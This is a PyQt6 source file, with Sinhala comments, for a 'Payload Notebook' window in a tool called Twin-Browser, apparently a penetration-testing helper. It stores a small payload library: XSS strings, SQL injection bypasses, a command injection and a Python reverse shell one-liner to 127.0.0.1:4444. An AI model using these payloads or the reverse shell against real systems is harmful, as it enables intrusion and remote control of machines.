from PyQt6.QtWidgets import QWidget, QTextEdit, QVBoxLayout, QHBoxLayout, QPushButton, QListWidget, QLabel, QFileDialog

class PayloadNotebook(QWidget):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("Twin-Browser: Payload Notebook")
        self.resize(700, 500)

        # Payload දත්ත (Dictionary එකක් ලෙස)
        self.payloads = {
            "XSS: Basic Alert": "<script>alert('XSS')</script>",
            "XSS: Image Error": "<img src=x onerror=alert(1)>",
            "SQLi: Auth Bypass": "' OR '1'='1' --",
            "SQLi: Union Select": "' UNION SELECT NULL, NULL, NULL --",
            "Command Injection": "; ls -la",
            "Reverse Shell (Python)": "python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"127.0.0.1\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'"
        }

        # UI කොටස්
        self.payload_list = QListWidget()
        self.payload_list.addItems(self.payloads.keys())
        self.payload_list.itemClicked.connect(self.insert_payload)

        self.text_area = QTextEdit()
        self.text_area.setPlaceholderText("Write your notes or modify payloads here...")

        self.save_btn = QPushButton("Save to File")
        self.save_btn.clicked.connect(self.save_file)

        # Layout සැකසීම
        left_layout = QVBoxLayout()
        left_layout.addWidget(QLabel("Payload Library:"))
        left_layout.addWidget(self.payload_list)

        right_layout = QVBoxLayout()
        right_layout.addWidget(QLabel("Editor:"))
        right_layout.addWidget(self.text_area)
        right_layout.addWidget(self.save_btn)

        main_layout = QHBoxLayout()
        main_layout.addLayout(left_layout, 1) # Payload list එකට 1/3 ඉඩක්
        main_layout.addLayout(right_layout, 2) # Editor එකට 2/3 ඉඩක්
        
        self.setLayout(main_layout)

    def insert_payload(self, item):
        # List එකෙන් තෝරන payload එක editor එකට එකතු කිරීම
        payload_text = self.payloads.get(item.text())
        self.text_area.append(payload_text)

    def save_file(self):
        path, _ = QFileDialog.getSaveFileName(self, "Save Note", "", "Text Files (*.txt)")
        if path:
            with open(path, "w") as f:
                f.write(self.text_area.toPlainText())